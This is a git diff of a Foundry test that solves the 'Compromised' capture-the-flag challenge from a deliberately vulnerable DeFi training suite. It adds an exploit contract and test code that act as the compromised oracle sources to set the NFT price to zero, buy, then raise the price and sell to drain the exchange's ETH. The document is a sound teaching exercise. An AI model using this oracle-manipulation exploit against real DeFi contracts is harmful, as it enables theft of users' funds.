@@ -9,6 +9,54 @@ import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
 import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
 import {Exchange} from "../../src/compromised/Exchange.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
+
+contract CompromisedExploit is IERC721Receiver{
+
+    TrustfulOracle oracle;
+    Exchange exchange;
+    DamnValuableNFT nft;
+    uint nftId;
+    address recovery;
+
+    constructor(
+        TrustfulOracle _oracle,
+        Exchange _exchange,
+        DamnValuableNFT _nft,
+        address _recovery
+    ) payable {
+        oracle = _oracle;
+        exchange = _exchange;
+        nft = _nft;
+        recovery = _recovery;
+    }
+
+    function buy() external payable{
+        uint _nftId = exchange.buyOne{value:1}();
+        nftId = _nftId;
+    }
+
+    function sell() external payable{
+        nft.approve(address(exchange), nftId);
+        exchange.sellOne(nftId);
+    }
+
+    function recover(uint amount) external {
+        payable(recovery).transfer(amount);
+    }
+
+    function onERC721Received(
+        address,
+        address,
+        uint256,
+        bytes calldata
+    ) external returns (bytes4){
+        return this.onERC721Received.selector;
+    }
+
+    receive() external payable{
+    }
+}
 
 contract CompromisedChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -71,11 +119,30 @@ contract CompromisedChallenge is Test {
         assertEq(nft.rolesOf(address(exchange)), nft.MINTER_ROLE());
     }
 
+    function setPrice(uint price) internal {
+        vm.startPrank(sources[0]);
+        oracle.postPrice(symbols[0],price);
+        vm.stopPrank();
+
+        vm.startPrank(sources[1]);
+        oracle.postPrice(symbols[0],price);
+        vm.stopPrank();
+    }
+
     /**
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+
+        CompromisedExploit exploit = new CompromisedExploit{value:address(this).balance}(oracle, exchange, nft, recovery);
+
+        setPrice(0);
+        exploit.buy();
+
+        setPrice(EXCHANGE_INITIAL_ETH_BALANCE);
+        exploit.sell();
+
+        exploit.recover(EXCHANGE_INITIAL_ETH_BALANCE);
     }
 
     /**
